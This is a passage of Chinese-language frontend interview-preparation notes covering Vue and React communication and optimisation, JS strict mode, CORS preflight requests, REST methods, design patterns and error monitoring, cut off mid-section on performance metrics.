- 传递组件数据需要使用 `provide() { return { x: this.xx } }` 形式，但做不到响应式
- 响应式需要借助 `computed` 来支持

## Vuex

Vuex 全局数据管理

## 答案

- 父子组件通讯
    - `props` `emits` `this.$emit`
    - `$attrs` （也可以通过 `v-bind="$attrs"` 向下级传递）
    - `$parent` `$refs`
- 多级组件上下级
    - `provide` `inject`
- 跨级、全局
    - 自定义事件
    - Vuex


# 前端基础知识\11-vuex-action-mutation-区别.md
# Vuex mutation action 区别

## 题目

Vuex mutation action 区别

## 答案

- mutation
    - 建议原子操作，每次只修改一个数据，不要贪多
    - 必须是同步代码，方便查看 devTools 中的状态变化
- action
    - 可包含多个 mutation
    - 可以是异步操作


# 前端基础知识\12-JS严格模式.md
# JS 严格模式和非严格模式

## 题目

JS 严格模式和非严格模式的区别

## 设计初衷

Javascript 设计之初，有很多不合理、不严谨、不安全之处，例如变量未定义即可使用 `n = 100`。严格模式用于规避这些问题。

而现在 ES 规范已经普及，从语法上已经规避了这些问题。

## 开启严格模式

代码（或一个函数）一开始插入一行 `'use strict'` 即可开启严格模式

```js
'use strict' // 全局开启

function fn() {
    'use strict' // 某个函数开启

}
```

一般情况下，开发环境用 ES 或者 Typescript ，打包出的 js 代码使用严格模式

## 严格模式的不同

严格模式的细则有很多，这里总结一些常用常见的

### 全局变量必须声明

```js
'use strict'
n = 10 // ReferenceError: n is not defined
```

### 禁止使用 `with`

```js
'use strict'
var obj = { x: 10 }
with (obj) {
    // Uncaught SyntaxError: Strict mode code may not include a with statement
    console.log(x)
}
```

### 创建 eval 作用域

正常模式下，JS 只有两种变量作用域：全局作用域 + 函数作用域。严格模式下，JS 增加了 eval 作用域。

**chrome 隐私模式下执行这段代码？？？**

```js
'use strict'
var x = 10
eval('var x = 20; console.log(x)')
console.log(x)
```

### 禁止 this 指向全局作用域

```js
'use strict'
function fn() {
    console.log('this', this) // undefined
}
fn()
```

### 函数参数不能重名

```js
'use strict'

// Uncaught SyntaxError: Duplicate parameter name not allowed in this context
function fn(x, x, y) {
    return
}
```

## 答案

- 全局变量必须声明
- 禁止使用 with
- 创建 eval 作用域
- 禁止 this 指向全局作用域
- 函数参数不能重名


# 前端基础知识\13-options请求.md
# options 请求

## 题目

跨域为何需要 options 请求？

## 跨域

浏览器同源策略，默认限制跨域请求。跨域的解决方案
- jsonp
- CORS

```js
// CORS 配置允许跨域（服务端）
response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011") // 或者 '*'
response.setHeader("Access-Control-Allow-Headers", "X-Requested-With")
response.setHeader("Access-Control-Allow-Methods", "PUT,POST,GET,DELETE,OPTIONS")
response.setHeader("Access-Control-Allow-Credentials", "true") // 允许跨域接收 cookie
```

## options 请求

使用 CORS 跨域请求时，经常会看到一个“多余”的 options 请求，之后才发送了实际的请求。

![](./img/options.png)

该请求就是为了检查服务端的 headers 信息，是否符合客户端的预期。所以它没有 body 的返回。

> 规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。—— MDN

## 答案

options 请求就是对 CORS 跨域请求之间的一次预检查，检查成功再发起正式请求，是浏览器自行处理的。<br>
了解即可，实际开发中不用过于关注。


# 前端基础知识\14-总结.md
# 总结

## 内容总结

本章讲解前端基础知识相关的面试题，包括 HTML CSS JS HTTP Ajax 等知识点。这都是技术一面时的必考知识点。

## 划重点

- HTML CSS JS 基础知识
- HTTP Ajax 基础知识
- Vue 等框架的基本应用

## 注意事项

- 不会从 0 基础讲起，基础不熟悉可以向讲师提问


# 前端基础知识\x1-文本小节-前端知识体系.md
# 前端知识体系

## 什么是知识体系

完善的知识范围，包含了前端工程师常用的所有知识点
合理的结构化，便于理解和记忆

## 主要模块

- 计算机基础，如算法、数据结构、设计模式等
- 前端基础知识，如 HTML JS 语法和 API 等
- 网络，如 HTTP 协议
- 开发流程，如打包构建、CI/CD
- 前端框架，常见的 Vue React 及其周边工具
- 运行和监控，如安全、性能优化

## 详细内容

内容较多，讲师专门制作了一个详细的思维导图，可以访问[what-is-fe](https://what-is-fe.gitee.io/) 网站来查看。

![](./img/知识体系.png)


# 前端基础知识\x2-文本小节-Restful-API-method.md
# Restful API 常用 method

以一个博客项目为例，实现“增删改查”功能，使用 Restful API 的接口设计如下

## 新增博客

- url `http://xxx.com/api/blog`
- method `POST` （request body 中有博客的内容）

## 删除博客

- url `http://xxx.com/api/blog/100` （`100` 为博客的 id）
- method `DELETE`

## 修改博客内容

- url `http://xxx.com/api/blog/100` （`100` 为博客的 id）
- method `PATCH` （request body 中有博客的内容）

另，跟 `PATCH` 很像的还有 `PUT` 方法，两者有差别
- `PUT` 更新全部内容，即替换
- `PATCH` 更新部分内容 —— 更加常用

## 查询博客

查询单个博客
- url `http://xxx.com/api/blog/100` （`100` 为博客的 id）
- method `GET`

查询博客列表
- url `http://xxx.com/api/blog`
- method `GET`

## 总结

- `GET` 查询
- `POST` 新增
- `PATCH` 更新
- `DELETE` 删除


# 实际工作经验\00-开始.md
# 开始

无论是校招还是社招，企业都希望得到工作经验丰富的候选人。所以面试时会有很多面试题来考察候选人，是否有真实工作经验（而非只做过个人项目和 demo）。本章将通过多个面试题，讲解前端面试常考的实际工作经验问题。

## 为何考察

企业都需要有工作经验的人才，入职之后简单培训就可以干活，不用再操心培养。毕竟现在人员流动很频繁。

而且，有实际工作经验的，他之前踩过很多坑，未来工作就可以多一些稳定性。

## 考察重点

各种能体现工作经验的题目，如
- 性能优化的实践
- 设计模式的应用
- 错误监控的实践 （不是真实项目，很少有错误监控）

## 注意事项

应届毕业生也需要工作经验 —— 你的毕业设计，实习经历

## 看几个题目

列几个有代表性的问题，参考视频。


# 实际工作经验\01-首屏优化.md
# 首屏优化

## 题目

H5 如何进行首屏优化？尽量说全

## 前端通用的优化策略

压缩资源，使用 CDN ，http 缓存等。本节只讨论首屏，这些先不讲。

## 路由懒加载

如果是 SPA ，优先保证首页加载。

## 服务端渲染 SSR

传统的 SPA 方式过程繁多
- 下载 html ，解析，渲染
- 下载 js ，执行
- ajax 异步加载数据
- 重新渲染页面

而 SSR 则只有一步
- 下载 html ，接续，渲染

如果是纯 H5 页面，SSR 就是首屏优化的终极方案。

技术方案：
- 传统的服务端模板，如 ejs smarty jsp 等
- Nuxt.js ( Vue 同构 )
- Next.js ( React 同构 )

## App 预取

如果 H5 在 App webview 中展示，可以使用 App 预取资源
- 在列表页，App 预取数据（一般是标题、首页文本，不包括图片、视频）
- 进入详情页，H5 直接即可渲染 App 预取的数据
- 可能会造成“浪费”：预期了，但用户未进入该详情页 —— 不过没关系，现在流量便宜

例如，你在浏览朋友圈时，可以快速的打开某个公众号的文章。

这里可以联想到 `prefetch` ，不过它是预取 js css 等静态资源，并不是首屏的内容。
不要混淆。

## 分页

根据显示设备的高度，设计尽量少的页面内容。即，首评内容尽量少，其他内容上滑时加载。

## 图片 lazyLoad

先加载内容，再加载图片。<br>
注意，提前设置图片容器的尺寸，尽量重绘，不要重排。

## 离线包 hybrid

提前将 html css js 等下载到 App 内。<br>
当在 App 内打开页面时，webview 使用 `file://` 协议加载本地的 html css js ，然后再 ajax 请求数据，再渲染。

可以结合 App 预取。

## 答案

- SSR
- 预取
- 分页
- 图片 lazyLoad
- hybrid

## 扩展

做完性能优化，还要进行统计、计算、评分，作为你的工作成果。

优化体验：如 骨架屏 loading


# 实际工作经验\02-渲染10w条数据.md
# 渲染 10w 条数据

## 题目

后端返回 10w 条数据，该如何渲染？

## 设计是否合理？

前端很少会有一次性渲染 10w 条数据的需求，而且如果直接渲染会非常卡顿。<br>
你可以反问面试官：这是什么应用场景。然后判断这个技术方案是否合理。

例如，就一个普通的新闻列表，后端一次性给出 10w 条数据是明显设计不合理的。应该分页给出。<br>
你能正常的反问、沟通、给出自己合理的建议，这本身就是加分项。

当然，面试官话语权更大，他可能说：对，不合理，但就非得这样，该怎么办？

## 自定义中间层

## 虚拟列表

基本原理
- 只渲染可视区域 DOM
- 其他隐藏区域不渲染，只用一个 `<div>` 撑开高度
- 监听容器滚动，随时创建和销毁 DOM

![](./img/虚拟列表.png)

虚拟列表实现比较复杂，特别是在结合异步 ajax 加载。明白实现原理，实际项目可用第三方 lib
- [vue-virtual-scroll-list](https://www.npmjs.com/package/vue-virtual-scroll-list)
- [react-virtualized](https://www.npmjs.com/package/react-virtualized)

## 答案

- 沟通需求和场景，给出自己合理的设计建议
- 虚拟列表

## 扩展

有时候面试官会出这种刁钻的问题来故意“难为”候选人，把自己扮演成后端角色，看候选人是否好欺负。<br>
如果此时你顺从面试官的问题继续埋头苦思，那就错了。应该适当的追问、沟通、提出问题、给出建议，这是面试官想要看到的效果。

实际工作中，前端和后端、服务端的人合作，那面会遇到各种设计沟通的问题。看你是否有这种实际工作经验。


# 实际工作经验\03-文本小节-用CSS实现文字超出省略.md
# 文字超出省略

注：文本小节

## 题目

文字超出省略，用哪个 CSS 样式？

## 分析

如果你有实际工作经验，实际项目有各种角色参与。页面需要 UI 设计，开发完还需要 UI 评审。<br>
UI 设计师可能是这个世界上最“抠门”的人，他们都长有像素眼，哪怕差 1px 他们都不会放过你。所以，开发时要严格按照视觉稿，100% 还原视觉稿。

但如果你没有实际工作经验（或实习经验），仅仅是自学的项目，或者跟着课程的项目。没有 UI 设计师，程序员的审美是不可靠的，肯定想不到很多细节。

所以，考察一些 UI 关注的细节样式，将能从侧面判断你有没有实际工作经验。

## 答案

单行文字

```css
#box1 {
    border: 1px solid #ccc;
    width: 100px;
    white-space: nowrap; /* 不换行 */
    overflow: hidden;
    text-overflow: ellipsis; /* 超出省略 */
}
```

多行文字

```css
#box2 {
    border: 1px solid #ccc;
    width: 100px;
    overflow: hidden;
    display: -webkit-box; /* 将对象作为弹性伸缩盒子模型显示 */
    -webkit-box-orient: vertical; /* 设置子元素排列方式 */
    -webkit-line-clamp: 3; /* 显示几行，超出的省略 */
}
```

## 扩展

UI 关注的问题还有很多，例如此前讲过的移动端响应式，Retina 屏 1px 像素问题。

再例如，网页中常用的字号，如果你有工作经验就知道，最常用的是 `12px` `14px` `16px` `20px` `24px` 等。你如果不了解，可以多去看看各种 UI 框架，例如 [antDesign 排版](https://ant.design/components/typography-cn/)。


# 实际工作经验\04-设计模式.md
# 设计模式

## 题目

前端常用的设计模式？什么场景？

## 开放封闭原则

设计原则是设计模式的基础，开放封闭原则是最重要的：对扩展开发，对修改封闭。

## 工厂模式

用一个工厂函数，创建一个实例，封装创建的过程。

```ts
class Foo { ... }

function factory(): Foo {
    // 封装创建过程，这其中可能有很多业务逻辑

    return new Foo(...arguments)
}
```

应用场景
- jQuery `$('div')` 创建一个 jQuery 实例
- React `createElement('div', {}, children)` 创建一个 vnode

## 单例模式

提供全局唯一的对象，无论获取多少次。

```js
class SingleTon {
    private constructor() {}
    public static getInstance(): SingleTon {
        return new SingleTon()
    }
    fn1() {}
    fn2() {}
}

// const s1 = new SingleTon() // Error: constructor of 'singleton' is private

const s2 = SingleTon.getInstance()
s2.fn1()
s2.fn2()

const s3 = SingleTon.getInstance()
s2 === s3 // true
```

应用场景
- Vuex Redux 的 store ，全局唯一的
- 全局唯一的 dialog modal

PS：JS 是单线程语言。如果是 Java 等多线程语言，创建单例时还需要考虑线程锁死，否则两个线程同时创建，则可能出现两份 instance 。

## 代理模式

使用者不能直接访问真实数据，而是通过一个代理层来访问。<br>
ES Proxy 本身就是代理模式，Vue3 基于它来实现响应式。

代码参考 proxy.html 

## 观察者模式

即常说的绑定事件。一个主题，一个观察者，主题变化之后触发观察者执行。

```js
// 一个主题，一个观察者，主题变化之后触发观察者执行
btn.addEventListener('click', () => { ... })
```

## 发布订阅模式

即常说的自定义事件，一个 `event` 对象，可以绑定事件，可以触发事件。

```js
// 绑定
event.on('event-key', () => {
    // 事件1
})
event.on('event-key', () => {
    // 事件2
})

// 触发执行
event.emit('event-key')
```

温故知新。在讲 JS 内存泄漏时提到，Vue React 组件销毁时，要记得解绑自定义事件。

```js
function fn1() { /* 事件1 */ }
function fn2() { /* 事件2 */ }

// mounted 时绑定
event.on('event-key', fn1)
event.on('event-key', fn2)

// beforeUnmount 时解绑
event.off('event-key', fn1)
event.off('event-key', fn2)
```

## 装饰器模式

ES 和 TS 的 Decorator 语法就是装饰器模式。可以为 class 和 method 增加新的功能。<br>
以下代码可以在 [ts playground](https://www.typescriptlang.org/play) 中运行。

```js
// class 装饰器
function logDec(target) {
    target.flag = true
}

@logDec
class Log {
    // ...
}

console.log(Log.flag) // true
```

```js
// method 装饰器
// 每次 buy 都要发送统计日志，可以抽离到一个 decorator 中
function log(target, name, descriptor) {
    // console.log(descriptor.value) // buy 函数
    const oldValue = descriptor.value // 暂存 buy 函数

    // “装饰” buy 函数
    descriptor.value = function(param) {
        console.log(`Calling ${name} with`, param) // 打印日志
        return oldValue.call(this, param) // 执行原来的 buy 函数
    };

    return descriptor
}
class Seller {
    @log
    public buy(num) {
        console.log('do buy', num)
    }
}

const s = new Seller()
s.buy(100)
```

Angular nest.js 都已广泛使用装饰器。这种编程模式叫做**AOP 面向切面编程**：关注业务逻辑，抽离工具功能。

```js
import { Controller, Get, Post } from '@nestjs/common';

@Controller('cats')
export class CatsController {
  @Post()
  create(): string {
    return 'This action adds a new cat';
  }

  @Get()
  findAll(): string {
    return 'This action returns all cats';
  }
}
```

## 答案

传统的经典设计模式有 23 个，作为面试题只说出几个前端常用的就可以。
- 工厂模式
- 单例模式
- 代理模式
- 观察者模式
- 发布订阅模式
- 装饰器模式

## 连环问：观察者模式和发布订阅模式的区别？

![](./img/观察者vs发布订阅.png)

观察者模式
- Subject 和 Observer 直接绑定，中间无媒介
- 如 `addEventListener` 绑定事件

发布订阅模式
- Publisher 和 Observer 相互不认识，中间有媒介
- 如 `eventBus` 自定义事件

## 连环问：MVC 和 MVVM 有什么区别

MVC 原理
- View 传送指令到 Controller
- Controller 完成业务逻辑后，要求 Model 改变状态
- Model 将新的数据发送到 View，用户得到反馈

![](./img/MVC.png)

MVVM 直接对标 Vue 即可
- View 即 Vue template
- Model 即 Vue data
- VM 即 Vue 其他核心功能，负责 View 和 Model 通讯

![](./img/MVVM.png)

![](./img/vue-mvvm.png)


# 实际工作经验\05-vue优化.md
# Vue 优化

## 题目

你在实际工作中，做过哪些 Vue 优化？

## 前端通用的优化策略

压缩资源，拆包，使用 CDN ，http 缓存等。本节只讨论首屏，这些先不讲。

## v-if 和 v-show

区别
- `v-if` 组件销毁/重建
- `v-show` 组件隐藏（切换 CSS `display`）

场景
- 一般情况下使用 `v-if` 即可，普通组件的销毁、渲染不会造成性能问题
- 如果组件创建时需要大量计算，或者大量渲染（如复杂的编辑器、表单、地图等），可以考虑 `v-show`

## v-for 使用 key

`key` 可以优化内部的 diff 算法。注意，遍历数组时 `key` 不要使用 `index` 。

```html
<ul>
    <!-- 而且，key 不要用 index -->
    <li v-for="(id, name) in list" :key="id">{{name}}</li>
</ul>
```

## computed 缓存

`computed` 可以缓存计算结果，`data` 不变则缓存不失效。

```js
export default {
    data() {
        return {
            msgList: [ ... ] // 消息列表
        }
    },
    computed: {
        // 未读消息的数量
        unreadCount() {
            return this.msgList.filter(m => m.read === false).length
        }
    }
}
```

## keep-alive

`<keep-alive>` 可以缓存子组件，只创建一次。通过 `activated` 和 `deactivated` 生命周期监听是否显示状态。<br>
代码参考 components/KeepAlive/index.vue

场景
- 局部频繁切换的组件，如 tabs
- 不可乱用 `<keep-alive>` ，缓存太多会占用大量内存，而且出问题不好 debug

## 异步组件

对于体积大的组件（如编辑器、表单、地图等）可以使用异步组件
- 拆包，需要时异步加载，不需要时不加载
- 减少 main 包的体积，页面首次加载更快

vue3 使用 `defineAsyncComponent` 加载异步组件，代码参考 components/AsyncComponent/index.vue

## 路由懒加载

对于一些补偿访问的路由，或者组件提交比较大的路由，可以使用路由懒加载。

```js
const routes = [
  {
    path: '/',
    name: 'Home',
    component: Home
  },
  {
    path: '/about',
    name: 'About',
    // 路由懒加载
    component: () => import(/* webpackChunkName: "about" */ '../views/About.vue')
  }
]
```

## SSR

SSR 让网页访问速度更快，对 SEO 友好。

但 SSR 使用和调试成本高，不可乱用。例如，一个低代码项目（在线制作 H5 网页），toB 部分不可用 SSR ， toC 部分适合用 SSR 。

## 答案

- v-if 和 v-show
- v-for 使用 key
- computed 缓存
- keep-alive
- 异步组件
- 路由懒加载
- SSR

## 扩展

网上看到过一些“较真”的性能优化，对比普通组件和函数组件，JS 执行多消耗了几 ms 。
- 如果这些是为了探索、学习前端技术，非常推荐
- 但在实际项目中要慎用，不要为了优化而优化。肉眼不可见的 ms 级的优化，对项目没有任何实际价值

## 连环问：Vue 遇到过哪些坑？？？

全局事件、自定义事件要在组件销毁时解除绑定
- 内存泄漏风险
- 全局事件（如 `window.resize`）不解除，则会继续监听，而且组件再次创建时会重复绑定

Vue2.x 中，无法监听 data 属性的新增和删除，以及数组的部分修改 —— Vue3 不会有这个问题
- 新增 data 属性，需要用 `Vue.set`
- 删除 data 属性，需要用 `Vue.delete`
- 修改数组某一元素，不能 `arr[index] = value` ，要使用 `arr.splice` API 方式

路由切换时，页面会 scroll 到顶部。例如，在一个新闻列表页下滑到一定位置，点击进入详情页，在返回列表页，此时会 scroll 到顶部，并重新渲染列表页。所有的 SPA 都会有这个问题，并不仅仅是 Vue 。
- 在列表页缓存数据和 `scrollTop`
- 返回列表页时（用 Vue-router [导航守卫](https://router.vuejs.org/zh/guide/advanced/navigation-guards.html)，判断 `from`），使用缓存数据渲染页面，然后 `scrollTo(scrollTop)`


# 实际工作经验\06-react优化.md
# React 优化

## 题目

你在实际工作中，做过哪些 React 优化？

## 前端通用的优化策略

压缩资源，拆包，使用 CDN ，http 缓存等。本节只讨论首屏，这些先不讲。

## 循环使用 key

`key` 可以优化内部的 diff 算法。注意，遍历数组时 `key` 不要使用 `index` 。

```jsx
const todoItems = todos.map((todo) =>
  {/* key 不要用 index */}
  <li key={todo.id}>
    {todo.text}
  </li>
)
```

## 修改 css 模拟 `v-show`

条件渲染时，可以通过设置 css 来处理显示和隐藏，不用非得销毁组件。模拟 Vue `v-show`

```jsx
{/* 模拟 v-show */}
{!flag && <MyComponent style={{display: 'none'}}/>}
{flag && <MyComponent/>}
```

或者

```jsx
{/* 模拟 v-show */}
<MyComponent style={{display: flag ? 'block' : 'none'}}/>
```

## 使用 Fragment 减少层级

组件层级过多，如果每个组件都以 `<div>` 作为 root ，则 DOM 层级太多而难以调试。

```jsx
render() {
  return <>
      <p>hello</p>
      <p>world</p>
  </>
}
```

## JSX 中不要定义函数

JSX 是一个语法糖，它和 Vue template 一样，最终将变为 JS render 函数，用以生成 vnode 。<br>
所以，如果在 JSX 中定义函数，那么每次组件更新时都会初始化该函数，这是一个不必要的开销。<br>
可回顾之前的面试题： `for 和 forEach 哪个更快`

```jsx
{/* Bad */}
<button onClick={() => {...}}>点击</button>
```

更好的解决方案是提前定义函数，在 JSX 中只引用执行。

```jsx
// Good
class MyComponent extends React.Component {
    clickHandler = () => { /*  */ }
    render() {
        return <>
            <button onClick={this.clickHandler}>点击</button>
        </>
    }
}
```

注意
- 如果你的系统不够复杂，这个优化几乎看不出效果，因为 JS 执行非常快 —— 但是，面试说出来肯定是一个加分项～
- 如果你用的是函数组件，这个优化方案不适用。如下代码：

```jsx
function App() {
  // 函数组件，每次组件更新都会重新执行 App 函数，所以内部的 clickHandler 函数也会被重新创建，这跟在 JSX 中定义是一样的
  // 不过 React 提供了 useCallback 来缓存函数，下文讲

  function clickHandler() {
    // ...
  }

  return (
    <>
      <button onClick={clickHandler}>点击</button>
    </>
  )
}
```

## 在构造函数 bind this

同理，如果在 JSX 中 bind this ，那每次组件更新时都要 bind 一次。在构造函数中 bind 更好。<br>
或者，直接使用箭头函数。

```jsx
class MyComponent extends React.Component {
    constructor() {
        // 要在构造函数中 bind this ，而不是在 JSX 中
        this.clickHandler1 = this.clickHandler1.bind(this)
    }
    clickHandler1() { /* 如果 JSX 中直接调用，则 this 不是当前组件。所以要 bind this */ }
    clickHander2 = () => { /* 使用箭头函数，不用 bind this */ }
    render() {
        return <>
            <button onClick={this.clickHandler1}>点击</button>
        </>
    }
}
```

PS：如果是函数组件，则不用 bind this

## 使用 shouldComponentUpdate 控制组件渲染

React 默认情况下，只要父组件更新，其下所有子组件都会“无脑”更新。如果想要手动控制子组件的更新逻辑
- 可使用 `shouldComponentUpdate` 判断
- 或者组件直接继承 `React.PureComponent` ，相当于在 `shouldComponentUpdate` 进行 props 的**浅层**比较

但此时，必须使用**不可变数据**，例如不可用 `arr.push` 而要改用 `arr.concat`。考验工程师对 JS 的熟悉程度。<br>
代码参考 components/SimpleTodos/index.js 的 class 组件。

不可变数据也有相应的第三方库
- [immutable.js](https://www.npmjs.com/package/immutable)
- [immer](https://www.npmjs.com/package/immer) —— 更加推荐，学习成本低

PS：React 默认情况（子组件“无脑”更新）这本身并不是问题，在大部分情况下并不会影响性能。因为组件更新不一定会触发 DOM 渲染，可能就是 JS 执行，而 JS 执行速度很快。所以，性能优化要考虑实际情况，不要为了优化而优化。

## React.memo 缓存函数组件

如果是函数组件，没有用 `shouldComponentUpdate` 和 `React.PureComponent` 。React 提供了 `React.memo` 来缓存组件。<br>
代码参考 FunctionalTodoList.js

`React.memo` 也支持自行比较

```js
function MyComponent(props) {
}
function areEqual(prevProps, nextProps) {
    // 自行比较，像 shouldComponentUpdate
}
export default React.memo(MyComponent, areEqual);
```

## useMemo 缓存数据

在函数组件中，可以使用 `useMemo` 和 `useCallback` 缓存数据和函数。

```jsx
function App(props) {
    const [num1, setNum1] = useState(100)
    const [num2, setNum2] = useState(200)

    const sum = useMemo(() => num1 + num2, [num1, num2]) // 缓存数据，像 Vue computed

    // const fn1 = useCallback(() => {...}, [...]) // 缓存函数

    return <p>hello {props.info}</p>
}
```

PS: 普通的数据和函数，没必要缓存，不会影响性能的。一些初始化比较复杂的数据，可以缓存。

## 异步组件

和 Vue 异步组件一样

```jsx
import React, { lazy, Suspense } from 'react'

// 记载异步组件
const OtherComponent = lazy(
  /* webpackChunkName: 'OtherComponent'*/
  () => import('./OtherComponent')
)

function MyComponent() {
  return (
    <div>
      <Suspense fallback={<div>Loading...</div>}> {/* 支持 loading 效果 */}
        <OtherComponent />
      </Suspense>
    </div>
  )
}
```

## 路由懒加载

和 Vue-router 路由懒加载一样

```js
import React, { lazy, Suspense } from 'react';
import { BrowserRouter as Router, Route, Switch } from 'react-router-dom';

const Home = lazy(() => import('./Home')); 
const List = lazy(() => import(/* webpackChunkName: 'Home'*/ './List'));

const App = () => (
  <Router>
    <Suspense fallback={<div>Loading...</div>}>
      <Switch>
        <Route exact path="/" component={Home}/>
        <Route path="/list" component={List}/>
      </Switch>
    </Suspense>
  </Router>
);
```

## SSR

同 Vue SSR

## 答案

- 循环使用 key
- 修改 css 模拟 `v-show`
- 使用 Fragment 减少层级
- JSX 中不要定义函数
- 在构造函数 bind this
- 使用 shouldComponentUpdate 控制组件渲染
- React.memo 缓存函数组件
- useMemo 缓存数据
- 异步组件
- 路由懒加载
- SSR

## 面试连环问：React 遇到哪些坑？

JSX 中，自定义组件命名，开头字母要大写，html 标签开头字母小写

```jsx
{/* 原生 html 组件 */}
<input/>

{/* 自定义组件 */}
<Input/>
```

JSX 中 `for` 写成 `htmlFor` ， `class` 写成 `className`

```js
{/* for 改成 htmlFor ，class 要改为 className */}
<label htmlFor="input-name" className="xxx">
    姓名 <input id="input-name"/>
<label>
```

state 作为不可变数据，不可直接修改，使用纯函数

```js
// this.state.list.push({...}) // 错误，不符合 React 规范
this.setState({
    list: curList.concat({...}) // 使用**不可变数据**
})
```

JSX 中，属性要区分 JS 表达式和字符串

```js
<Demo position={1} flag={true}/>
<Demo position="1" flag="true"/>
```

state 是异步更新的，要在 callback 中拿到最新的 state 值

```js
const curNum = this.state.num
this.setState({
    num: curNum + 1
}, () => {
    console.log('newNum', this.state.num) // 正确
})
// console.log('newNum', this.state.num) // 错误
```

React Hooks 有很多限制，注意不到就会踩坑。例如，`useEffect` 内部不能修改 state

```js
function App() {
    const [count, setCount] = useState(0)

    useEffect(() => {
        const timer = setInterval(() => {
            setCount(count + 1) // 如果依赖是 [] ，这里 setCount 不会成功
        }, 1000)

        return () => clearTimeout(timer)
    }, [count]) // 只有依赖是 [count] 才可以，这样才会触发组件 update

    return <div>count: {count}</div>
}

export default App
```

再例如，`useEffect` 依赖项（即第二个参数）里有对象、数组，就会出现死循环。所以，依赖项里都要是值类型。<br>
因为 React Hooks 是通过 `Object.is` 进行依赖项的前后比较。如果是值类型，则不妨碍。
如果是引用类型，前后的值是不一样的（纯函数，每次新建值），就类似 `{x:100} !== {x:100}`

```js
useEffect(() => {
    // ...
}, [obj, arr])
```

## 面试连环问：setState 是同步还是异步？

前端经典面试题。先作为思考题，后面会结合代码详细讲解。


# 实际工作经验\07-忽略本节.md
忽略本文


# 实际工作经验\08-vue错误监听.md
# Vue 错误监听

## 题目

如何统一监听 Vue 组件报错？

## 分析

真实项目需要**闭环**，即考虑各个方面，除了基本的功能外，还要考虑性能优化、报错、统计等。
而个人项目、课程项目一般以实现功能为主，不会考虑这么全面。所以，没有实际工作经验的同学，不会了解如此全面。

## window.onerror

可以监听当前页面所有的 JS 报错，jQuery 时代经常用。<br>
注意，全局只绑定一次即可。不要放在多次渲染的组件中，这样容易绑定多次。

```js
window.onerror = function(msg, source, line, column, error) {
    console.log('window.onerror---------', msg, source, line, column, error)
}
// 注意，如果用 window.addEventListener('error', event => {}) 参数不一样！！！
```

## errorCaptured 生命周期

会监听所有**下级组件**的错误。可以返回 `false` 阻止向上传播，因为可能会有多个上级节点都监听错误。

```js
errorCaptured(error, instance, info) {
    console.log('errorCaptured--------', error, instance, info)
}
```

## errorHandler

全局的错误监听，所有组件的报错都会汇总到这里来。PS：如果 `errorCaptured` 返回 `false` 则**不会**到这里。

```js
const app = createApp(App)
app.config.errorHandler = (error, instance, info) => {
    console.log('errorHandler--------', error, instance, info)
}
```

请注意，`errorHandler` 会阻止错误走向 `window.onerror`。

PS：还有 `warnHandler`

## 异步错误

组件内的异步错误 `errorHandler` 监听不到，还是需要 `window.onerror`

```js
mounted() {
    setTimeout(() => {
        throw new Error('setTimeout 报错')
    }, 1000)
},
```

## 答案

方式
- `errorCaptured` 监听下级组件的错误，可返回 `false` 阻止向上传播
- `errorHandler` 监听 Vue 全局错误
- `window.onerror` 监听其他的 JS 错误，如异步

建议：结合使用
- 一些重要的、复杂的、有运行风险的组件，可使用 `errorCaptured` 重点监听
- 然后用 `errorHandler` `window.onerror` 候补全局监听，避免意外情况

## 扩展

Promise 监听报错要使用 `window.onunhandledrejection` ，后面会有面试题讲解。

前端拿到错误监听之后，需要传递给服务端，进行错误收集和分析，然后修复 bug 。
后面会有一道面试题专门讲解。


# 实际工作经验\09-react错误监听.md
# React 错误监听

## 题目

如何统一监听 React 组件报错？

## 分析

真实项目需要**闭环**，即考虑各个方面，除了基本的功能外，还要考虑性能优化、报错、统计等。
而个人项目、课程项目一般以实现功能为主，不会考虑这么全面。所以，没有实际工作经验的同学，不会了解如此全面。

## ErrorBoundary

React 16+ 引入。可以监听所有**下级**组件报错，同时降级展示 UI 。<br>
代码参考 ErrorBoundary.js 和 components/ErrorDemo

建议应用到最顶层，监听全局错误

```jsx
// index.js 入口文件
ReactDOM.render(
  <React.StrictMode>
    <ErrorBoundary>
      <App />
    </ErrorBoundary>
  </React.StrictMode>,
  document.getElementById('root')
);
```

函数组件中也可以使用

```js
function App(props) {
    return <ErrorBoundary>
        {props.children}
    </ErrorBoundary>
}
```

## dev 和 build

dev 环境下无法看到 ErrorBoundary 的报错 UI 效果。会显示的提示报错信息。<br>
`yarn build` 之后再运行，即可看到 UI 效果。

## 事件报错

React 不需要 ErrorBoundary 来捕获事件处理器中的错误。与 `render` 方法和生命周期方法不同，事件处理器不会在渲染期间触发。

如果你需要在事件处理器内部捕获错误，使用普通的 `try-catch` 语句。也可以使用全局的 `window.onerror` 来监听。

## 异步错误

ErrorBoundary 无法捕捉到异步报错，可使用 `window.onerror` 来监听。

```js
window.onerror = function(msg, source, line, column, error) {
    console.log('window.onerror---------', msg, source, line, column, error)
}
// 注意，如果用 window.addEventListener('error', event => {}) 参数不一样！！！
```

## 答案

- ErrorBoundary 监听渲染时报错
- `try-catch` 和 `window.onerror` 捕获其他错误

## 扩展

Promise 监听报错要使用 `window.onunhandledrejection` ，后面会有面试题讲解。

前端拿到错误监听之后，需要传递给服务端，进行错误收集和分析，然后修复 bug 。
后面会有一道面试题专门讲解。


# 实际工作经验\10-排查性能问题.md
# 排查性能问题

## 题目

如果一个 h5 很慢，你该如何排查问题？

## 分析

注意审题，看面试官问的是哪方面的慢。如果他没有说清楚，你可以继续追问一下。
- 加载速度慢。则考虑网页文件、数据请求的优化，即本文所讲
- 运行卡顿，体验不流畅。则考虑内存泄漏、节流防抖、重绘重排的方面，此前面试题已经讲过

## 前端性能指标

能搜索到的性能指标非常多，也有很多非标准的指标。最常用的指标有如下几个：

### First Paint (FP)
从开始加载到浏览器**首次绘制像素**到屏幕上的时间，也就是页面在屏幕上首次发生视觉变化的时间。但此变化可能是简单的背景色更新或不引人注意的内容，它并不表示页面内容完整性，可能会报告没有任何可见的内容被绘制的时间。

### First Contentful Paint（FCP）
浏览器**首次绘制来自 DOM 的内容**的时间，内容必须是文本、图片（包含背景图）、非白色的 canvas 或 SVG，也包括带有正在加载中的 Web 字体的文本。

### First Meaningful Paint（FMP）
